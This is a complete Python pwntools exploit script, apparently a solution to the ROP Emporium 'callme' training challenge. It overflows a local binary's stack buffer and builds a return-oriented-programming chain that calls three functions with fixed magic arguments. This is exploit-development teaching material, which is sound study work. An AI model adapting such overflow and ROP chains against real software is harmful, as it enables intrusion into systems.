#!/usr/bin/python3

from pwn import *

PROG_NAME = "./callme"

p = process(PROG_NAME)
elf = p.elf
rop = ROP(elf)

if args.ATTACH:
	gdb.attach(p, '''break main''')

pop_rdi_rsi_rdx_addr = rop.find_gadget(['pop rdi', 'pop rsi', 'pop rdx'])[0]
ret_addr = rop.find_gadget(['ret'])[0]

p.recvuntil(b'> ')

payload = b'A' * (0x20 + 0x8)
payload += p64(ret_addr)

for func in ['callme_one', 'callme_two', 'callme_three']:
	payload += p64(pop_rdi_rsi_rdx_addr)
	payload += p64(0xdeadbeefdeadbeef)
	payload += p64(0xcafebabecafebabe)
	payload += p64(0xd00df00dd00df00d)
	payload += p64(elf.symbols[func])

p.sendline(payload)

p.interactive()